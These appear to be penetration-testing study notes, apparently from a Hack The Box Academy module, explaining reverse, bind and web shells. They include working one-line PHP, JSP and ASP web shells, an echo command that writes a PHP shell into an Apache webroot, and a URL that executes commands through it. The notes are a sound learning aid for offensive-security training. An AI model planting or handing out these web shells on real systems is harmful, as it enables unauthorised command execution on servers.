https://academy.hackthebox.com/module/77/section/725

# Type of Shell 	Method of Communication

1. Reverse Shell 	Connects back to our system and gives us control through a reverse connection.

2. Bind Shell 	    Waits for us to connect to it and gives us control once we do.

3. Web Shell 	    Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

# Reverse Shell

A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. 

Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. 

With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.

* Example Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://highon.coffee/blog/reverse-shell-cheat-sheet/

- Netcat Listener


# Bind Shell

Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.

Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host's shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system.

* Example Payloads


# Web Shell
https://www.hackingarticles.in/web-shells-penetration-testing/

The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

Web shells are the scripts which are coded in many languages like PHP, Python, ASP, Perl and so on which further use as backdoor for illegitimate access in any server by uploading it on a web server.

The attacker can then directly perform the read and write operation once the backdoor is uploaded to a destination, you can edit any file of delete the server file. Today we are going to explore all kinds of php web shells what-so-ever are available in Kali Linux and so on. So, let’s get started.

Kali Linux has inbuilt PHP Scripts for utilizing them as a backdoor to assist Pen-testing work. They are stored inside /usr/share/webshells/php and a pen-tester can directory make use of them without wasting time in writing PHP code for the malicious script.

* Example Payloads

- PHP- <?php system($_REQUEST["cmd"]); ?>
- JSP- <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
- ASP- <% eval request("cmd") %>

- simple backdoor.php
- qsd-php backdoor web shell
- php-reverse-shell.php

> File upload in picture
Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

Web Server 	Default Webroot
Apache 	/var/www/html/
Nginx 	/usr/local/nginx/html/
IIS 	c:\inetpub\wwwroot\
XAMPP 	C:\xampp\htdocs\

We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
Code: bash

echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:

http://SERVER_IP:PORT/shell.php?cmd=id



# Burp Collaborator
https://portswigger.net/web-security/file-upload